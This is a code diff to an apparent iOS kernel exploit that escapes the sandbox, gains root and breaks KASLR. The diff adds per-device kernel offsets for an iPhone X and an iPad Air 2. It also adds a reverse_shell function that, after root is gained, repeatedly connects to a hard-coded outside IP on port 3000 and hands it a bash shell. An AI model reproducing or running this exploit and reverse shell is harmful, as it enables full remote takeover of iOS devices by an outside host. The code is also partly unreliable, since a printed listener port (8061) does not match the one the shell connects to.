@@ -19,6 +19,15 @@
 #include <unistd.h>
 
 #include "webserver.h"
+#include <sys/sysctl.h>
+#include <sys/utsname.h>
+
+// reverse shell library
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+// end
 
 #ifndef AF_MULTIPATH
 #define AF_MULTIPATH 39
@@ -30,6 +39,52 @@
 #define TOOLAZY_PORTS_COUNT 1000
 #define REFILL_USERCLIENTS_COUNT 1000
 #define MAX_PEEKS 30000
+
+uint64_t kernel_proc_offset;
+uint64_t kaslr_offset;
+
+void reverse_shell()
+{
+    int socket_info;
+    int connectie;
+    int pid;
+    struct sockaddr_in aanvaller_info;
+    
+    
+    while(1){
+        //soort socket, IPv4, poort nummer, aanvallers' IP.
+        socket_info = socket(AF_INET, SOCK_STREAM, 0);
+        aanvaller_info.sin_family = AF_INET;
+        aanvaller_info.sin_port = htons(3000);
+        aanvaller_info.sin_addr.s_addr = inet_addr("107.102.185.103"); //since this is a reverse shell, the 'attacker's IP address should be put here.
+        printf("Set data.\n");
+        
+        printf("Trying to make connection....\n");
+        connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
+        while(connectie < 0){
+            printf("Connection failed, try again....\n");
+            sleep(5);
+            connectie = connect(socket_info, (struct sockaddr *)&aanvaller_info, sizeof(struct sockaddr));
+        }
+        connectie = write(socket_info,"Connection craeted....\n",36);
+        
+        printf("Connection success....\n");
+        
+        pid = fork();
+        if(pid > 0){
+            printf("PARENT process; wait until shell process is finished.\n");
+            wait(NULL);
+        }
+        if(pid == 0){
+            printf("CHILD process; input / output from now through the socket -> start the shell.\n");
+            dup2(socket_info,0); // input
+            dup2(socket_info,1); // output
+            dup2(socket_info,2); // errors
+            execl("ios64bin/bash", "ios64bin/bash", NULL);
+        }
+        printf("CHILD is closed; back to the while loop.\n");
+    }
+}
 
 static void _init_port_with_empty_msg(mach_port_t port)
 {
@@ -83,7 +138,7 @@ static int __writeKernelMemory(uint64_t Address, uint64_t Len, void *From)
 // This will not enable all QiLin features - but enough for us
 void _init_tfp0less_qilin(uint64_t kaslr_shift)
 {
-    uint64_t kernproc = 0xfffffff0076450a8 + kaslr_shift;
+    uint64_t kernproc = kernel_proc_offset + kaslr_shift;
     uint64_t *m = (uint64_t *)mmap((void *)0x110000000, 0x4000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
     
     *m = (uint64_t)__readKernelMemory;
@@ -109,12 +164,33 @@ void post_exploitation(uint64_t kernel_base, uint64_t kaslr_shift)
     
     printf("If all went well, sandbox escaped and root achieved now, test it if you want\n");
     
+    printf("Connect back, make sure you was nc -l 8061");
+    reverse_shell();
+    
     printf("Web Server running on port 80\n");
     wsmain(0);
 }
 
 void jb_go(void)
 {
+    struct utsname kvers = {0};
+    uname(&kvers);
+    
+    //printf("Your machine is %s\n", kvers.machine);
+    //iPhone X 15E302
+    if(strncmp(kvers.machine, "iPhone10,3", sizeof("iPhone10,3")) == 0)
+    {
+        kernel_proc_offset = 0xfffffff0076450a8;
+        kaslr_offset = 0xfffffff006fdd978;
+    }
+    
+    //iPad Air 2 (WiFi)
+    if(strncmp(kvers.machine, "iPad5,3", sizeof("iPad5,3")) == 0)
+    {
+        kernel_proc_offset = 0xfffffff0075dd0a0;
+        kaslr_offset = 0xfffffff006fd9dd0;
+    }
+    
     io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
     mach_port_t first_ports[FIRST_PORTS_COUNT];
     mach_port_t refill_ports[REFILL_PORTS_COUNT];
@@ -207,7 +283,7 @@ void jb_go(void)
     recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
     
     uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
-    uint64_t kaslr_shift = vtable - 0xfffffff006fdd978;
+    uint64_t kaslr_shift = vtable - kaslr_offset;
     printf("AGXCommandQueue vtable: %p\n", (void *)vtable);
     printf("kaslr shift: %p\n", (void *)kaslr_shift);
     
